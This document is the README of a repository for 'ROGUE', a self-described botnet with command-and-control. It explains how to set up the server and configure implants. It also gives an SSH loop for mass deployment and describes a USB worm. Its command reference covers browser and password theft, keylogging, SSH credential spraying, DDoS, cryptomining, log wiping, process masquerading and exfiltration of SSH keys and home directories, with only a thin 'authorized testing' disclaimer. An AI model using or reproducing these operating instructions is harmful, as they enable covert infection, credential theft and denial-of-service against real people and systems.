# ROGUE - Botnet w/ integrated c2 v3.0

![rogue banner](https://github.com/user-attachments/assets/7dd2e5a3-398a-4487-a46b-541673b0f3b3)

## Overview

ROGUE v3.0 is a comprehensive encrypted command-and-control framework designed for authorized penetration testing, red team operations, and incident response training. Featuring AES-256 encryption, web-based administration, and an extensive payload arsenal, ROGUE provides professional-grade capabilities for security testing.

---

##  What's New in v3.0

### **Enhanced Payload Suite**
- **12+ Professional Payloads** for reconnaissance, privilege escalation, and data collection
- **Compound Operations** for automated red team workflows
- **Advanced Stealth** with improved persistence and evasion techniques

### **Modern Web Interface**
- **Tabbed Interface** for organized operation management
- **Category-Based Operations** (Recon, Persistence, Collection, etc.)
- **Real-time Results Viewer** with command history
- **Payload Management System** with direct load/run capabilities

### **Professional Features**
- **Implant Self-Update** - Update implants from C2
- **Health Monitoring** - Real-time implant status checking
- **Forensic Cleanup** - Automated log cleaning and trace removal
- **DNS Tunneling** - Covert C2 channel via DNS queries

---

## Installation & Setup

### **Clone Repository**
```bash
git clone https://github.com/ekomsSavior/rogue.git
cd rogue
```

### **Install Dependencies**
```bash
# Core dependencies
sudo apt update
sudo apt install python3 python3-pip python3-dev python3-venv -y


# Install Python packages
pip3 install pycryptodome flask requests psutil setproctitle netifaces --break-system-packages

# Optional dependencies for enhanced payloads
pip3 install paramiko pynput pyautogui python-nmap secretstorage --break-system-packags
```
if you dont want to run break system packages use a VENV and do it from there.


### **Ngrok Setup**
```bash
# Download and install ngrok
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xvzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/

# Set up authentication
ngrok config add-authtoken YOUR_NGROK_AUTH_TOKEN
```

---

##  Quick Start Guide

### **1. Start C2 Server** (Control Center)
```bash
python3 rogue_c2.py
```

**Expected Output:**
```
============================================================
 ROGUE C2 SERVER - Complete Command & Control
============================================================
[✓] Exfil listener started on port 9091
[✓] Reverse shell listener started on port 9001
[*] Starting ngrok tunnel...
[✓] C2 SERVER IS LIVE!
[NGROK] C2 URL: https://your-subdomain.ngrok-free.dev
[NGROK] Hostname: your-subdomain.ngrok-free.dev
[NGROK] Payloads: https://your-subdomain.ngrok-free.dev/payloads/
[ADMIN] Web Panel: http://localhost:4444/admin
============================================================
```

### **2. Configure Implant**
Edit `rogue_implant.py` with your C2 details:
```python
C2_HOST = 'your-ngrok-subdomain.ngrok-free.dev'
C2_PORT = 4444
PAYLOAD_REPO = "https://your-ngrok-subdomain.ngrok-free.dev/payloads/"
```

### **3. Deploy Implants**

**Manual Deployment:**
```bash
python3 rogue_implant.py
```

**Mass Deployment (SSH):**
```bash
for ip in $(cat targets.txt); do
    scp rogue_implant.py user@$ip:/tmp/ && \
    ssh user@$ip "cd /tmp && python3 rogue_implant.py &"
done
```

**USB Worm Propagation:**
- Insert USB drive into infected system
- Implant auto-copies to USB as `.rogue_worm/`
- Plug USB into new system to infect

---

##  Web Interface Guide

![IMG_1038](https://github.com/user-attachments/assets/68ce8029-3366-49a2-97e9-74e462274015)

### **Access Control Panel**
```
http://localhost:4444/admin
```

### **Interface Layout**

#### **Tab 1: Active Bots**
- View connected implants with real-time status
- Send commands to individual bots
- Monitor command results and pending queues
- Color-coded status indicators (green = active)

#### **Tab 2: Operations**
**Reconnaissance & Intelligence**
```
trigger_sysrecon        # Comprehensive system reconnaissance
trigger_linpeas         # Linux privilege escalation checker
trigger_hashdump        # Password hash extraction
trigger_browsersteal    # Browser credential theft
trigger_network_scan    # Network host discovery
```

**Advanced Operations**
```
trigger_full_recon      # Complete reconnaissance suite
trigger_harvest_all     # Comprehensive data collection
trigger_clean_sweep     # Forensic cleanup & restart
```

**Persistence & Stealth**
```
trigger_stealthinject   # PolyRoot persistence installation
trigger_persistence_setup # Additional persistence mechanisms
trigger_defense_evasion  # Anti-forensic techniques
trigger_logclean        # System log cleaning
trigger_logclean all    # Aggressive log cleaning
```

**Monitoring & Collection**
```
trigger_keylogger       # Start keystroke logging
trigger_keylogger stop  # Stop keylogger
trigger_screenshot      # Periodic screen capture
trigger_screenshot stop # Stop screenshot capture
reverse_shell          # Interactive reverse shell
```

**Lateral Movement**
```
trigger_lateral_move    # Automated lateral movement
trigger_autodeploy      # Network auto-deployment
trigger_sshspray        # SSH credential spraying
trigger_dnstunnel       # DNS tunneling C2
trigger_dnstunnel stop  # Stop DNS tunnel
```

**DDoS & Cryptomining**
```
trigger_ddos <target> <port> <time>  # DDoS attack
trigger_mine            # Start cryptocurrency miner
trigger_stopmine        # Stop miner
```

**Implant Management**
```
trigger_status          # Check implant health
trigger_self_update     # Update implant from C2
trigger_help           # Show available commands
trigger_forensics_check # Check for forensic artifacts
```

**Data Exfiltration**
```
trigger_exfil /etc      # Exfiltrate system configuration
trigger_exfil /home     # Exfiltrate user directories
trigger_exfil ~/.ssh    # Exfiltrate SSH keys
trigger_dumpcreds       # Dump credentials from common locations
```

#### **Tab 3: Payloads**
- Browse available payloads
- Direct load/run buttons
- Payload descriptions and categories
- Organized by operation type

#### **Tab 4: Results**
- Command execution history
- Timestamped results
- Filter by bot ID
- Export capabilities

#### **Tab 5: Server Status**
- Server uptime
- Ngrok tunnel status
- Active bot count
- System resource monitoring

---

##  Payload Reference

### **Core Payloads**

#### **System Reconnaissance** (`sysrecon.py`)
```bash
trigger_sysrecon
```
**Collects:**
- System hardware information
- Network configuration
- User accounts and privileges
- Running processes and services
- Installed software inventory
- Security defenses status

#### **Privilege Escalation** (`linpeas_light.py`)
```bash
trigger_linpeas
```
**Checks:**
- Sudo privileges and misconfigurations
- SUID/SGID binaries
- World-writable files and directories
- Cron job vulnerabilities
- Kernel exploits
- Linux capabilities

#### **Credential Access** (`hashdump.py`)
```bash
trigger_hashdump
```
**Extracts:**
- Linux password hashes (/etc/shadow)
- Windows SAM hashes (if available)
- SSH private/public keys
- Browser saved credentials
- Memory credential artifacts

#### **Browser Data Theft** (`browserstealer.py`)
```bash
trigger_browsersteal
```
**Targets:**
- Firefox: logins, cookies, history, bookmarks
- Chrome/Chromium: saved passwords, autofill data
- Edge/Brave: credentials and browsing data
- Safari: keychain and browsing history

#### **Monitoring Payloads**
```bash
trigger_keylogger       # Real-time keystroke logging
trigger_screenshot      # Periodic screen capture (every 60s)
```

#### **Defense Evasion** (`logcleaner.py`)
```bash
trigger_logclean        # Clean implant traces
trigger_logclean all    # Aggressive system log cleaning
```

#### **Lateral Movement** (`sshspray.py`)
```bash
trigger_sshspray <target> <userlist> <passlist>
```
**Features:**
- Multi-threaded SSH authentication attempts
- Common credential dictionary
- Success/failure reporting
- Session persistence

#### **Covert C2** (`dnstunnel.py`)
```bash
trigger_dnstunnel       # Start DNS tunneling
```
**Uses DNS queries for:**
- Command delivery
- Data exfiltration
- C2 communication bypassing firewalls

---

##  Advanced Usage

### **Compound Operations**

#### **Full Reconnaissance Suite**
```bash
trigger_full_recon
```
**Executes sequentially:**
1. System reconnaissance
2. Privilege escalation checks
3. Password hash extraction
4. Network scanning

#### **Complete Data Harvest**
```bash
trigger_harvest_all
```
**Collects:**
1. Browser credentials and data
2. System password hashes
3. SSH keys and certificates
4. Configuration files
5. User documents and downloads

#### **Clean Sweep Operation**
```bash
trigger_clean_sweep
```
**Performs:**
1. System log cleaning
2. Defense evasion techniques
3. Implant restart in stealth mode
4. Forensic artifact removal

### **Implant Management**

#### **Health Checking**
```bash
trigger_status
```
**Reports:**
- Implant ID and C2 connectivity
- System resource usage
- Process stealth status
- Available payloads
- Uptime and beacon count

#### **Remote Update**
```bash
trigger_self_update
```
- Downloads latest implant from C2
- Replaces current version
- Maintains persistence
- Preserves configuration

### **Data Exfiltration**

#### **Targeted Exfiltration**
```bash
trigger_exfil /path/to/target
```
**Common targets:**
- `/etc` - System configuration
- `/home` - User directories
- `/var/log` - System logs
- `~/.ssh` - SSH keys and configs
- `~/Documents` - User documents

#### **Credential Dumping**
```bash
trigger_dumpcreds
```
**Targets default locations:**
- `~/Documents`
- `~/Downloads`
- `~/Pictures`
- `~/Desktop`
- `~/.ssh`

---

##  Stealth & Persistence

### **Silent Operation Modes**

**Manual Execution** (Visible for debugging):
```bash
python3 rogue_implant.py
# Shows beacon activity and command execution
```

**Persistence Mode** (Completely silent):
- Auto-starts from `.bashrc` on login
- No terminal output
- Output redirected to `~/.cache/.rogue/.implant.log`
- Process masquerades as `systemd-journald`

### **Persistence Mechanisms**

1. **Bashrc Injection** - Primary persistence
2. **Systemd Service** - Service-based persistence (optional)
3. **Cron Jobs** - Scheduled execution
4. **USB Worm** - Removable drive propagation
5. **PolyRoot** - Privileged persistence via SUID

### **Defense Evasion**

**Log Cleaning:**
```bash
trigger_logclean        # Clean implant-specific logs
trigger_logclean all    # Clean all suspicious entries
```

**Process Hiding:**
- Masquerades as `systemd-journald`
- Randomizes check-in intervals
- Uses encrypted communications
- Implements P2P fallback channels

---

##  C2 Communication

### **Primary Channel (HTTPS)**
- Encrypted AES-256 communication
- 30-second beacon interval
- Automatic reconnection
- Command queuing system

### **Fallback Channels**

**Discord:**
- Commands via Discord channel messages
- Results via webhook
- Useful when HTTPS blocked

**P2P Network:**
- Bot-to-bot communication
- UDP broadcast on ports 7008-7011
- Command relay capability

**DNS Tunneling:**
- Covert channel via DNS queries
- Bypasses network restrictions
- Slower but highly stealthy

---

##  Emergency Procedures

### **Implant Removal from Target**
```bash
# Quick removal (recommended)
sudo pkill -9 -f rogue && sudo rm -rf ~/.cache/.rogue && \
sed -i '/ROGUE\|rogue_agent\|systemd-journald/d' ~/.bashrc ~/.profile ~/.bash_profile && \
echo "✓ Rogue removed"

# Verification
ps aux | grep -E "rogue|\.rogue" | grep -v grep || echo "System clean"
ls -la ~/.cache/.rogue/ 2>/dev/null || echo "No hidden directory"
```

### **C2 Server Shutdown**
```bash
# Graceful shutdown
pkill -f "python3 rogue_c2.py"
pkill -f "ngrok"
rm -f exfil_*.zip exfil_*.bin

# Clean restart
./cleanup.sh  # Optional cleanup script
```

### **Forensic Cleanup**
```bash
# Remove all traces
trigger_clean_sweep        # From C2 panel
# OR
trigger_logclean all      # Aggressive log cleaning
```

---

##  Troubleshooting

### **Common Issues & Solutions**

**Ngrok Connection Issues:**
```bash
# Check ngrok status
curl http://localhost:4040/api/tunnels

# Restart ngrok
pkill ngrok
ngrok http 4444
sleep 5
```

**Implant Not Connecting:**
```bash
# Test C2 connectivity from target
curl -k https://your-c2.ngrok-free.dev

# Check implant logs
cat ~/.cache/.rogue/.implant.log 2>/dev/null

# Verify payload delivery
curl -k https://your-c2.ngrok-free.dev/payloads/test.py
```

**Web Interface Issues:**
```bash
# Check Flask is running
netstat -tlnp | grep 4444

# Check for port conflicts
sudo lsof -i :4444

# Restart C2 server
pkill -f "python3 rogue_c2.py"
python3 rogue_c2.py
```

**Payload Execution Errors:**
```bash
# Check dependencies
pip3 install psutil netifaces paramiko pynput

# Verify Python version
python3 --version

# Check file permissions
chmod +x payloads/*.py
```

### **Log Files & Diagnostics**

**C2 Server Logs:**
- Console output during startup
- Flask application logs
- Exfiltration processing logs

**Implant Logs:**
- `~/.cache/.rogue/.implant.log` (silent mode)
- Console output (manual mode)
- Beacon activity and command results

**Network Diagnostics:**
```bash
# Test C2 connectivity
ping your-c2.ngrok-free.dev
nc -zv your-c2.ngrok-free.dev 443
curl -k -I https://your-c2.ngrok-free.dev

# Test exfiltration port
nc -zv your-c2.ngrok-free.dev 9091
```

---

##  Command Quick Reference

### **Essential Commands**
```bash
# System Information
whoami
uname -a
ip a
ps aux

# File Operations
ls -la /home
find / -type f -name "*.conf" 2>/dev/null | head -20
cat /etc/passwd

# Network Operations
netstat -tunap
ss -tunap
arp -a
```

### **Trigger Commands (C2 Panel)**
```bash
# Reconnaissance
trigger_sysrecon
trigger_linpeas
trigger_hashdump
trigger_browsersteal

# Operations
trigger_full_recon
trigger_harvest_all
trigger_clean_sweep

# Persistence
trigger_stealthinject
trigger_persistence_setup
trigger_defense_evasion

# Monitoring
trigger_keylogger
trigger_screenshot
reverse_shell

# Management
trigger_status
trigger_self_update
trigger_help
```

### **Payload Commands**
```bash
# Load and execute
load_payload sysrecon.py
run_payload sysrecon.py

# Direct execution
python3 ~/.cache/.rogue/sysrecon.py
```

---

##  License & Disclaimer

### **License**
This project is released for educational purposes only. Users assume all responsibility for legal compliance.

### **Disclaimer**
```
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
The author assumes no liability for misuse or damage caused by this software.
Users must obtain proper authorization before use.
```

![rogue](https://github.com/user-attachments/assets/d8c0e482-efa0-4f43-86dc-bf8e15505520)

---
*Last Updated: v3.0 | For authorized security testing only*
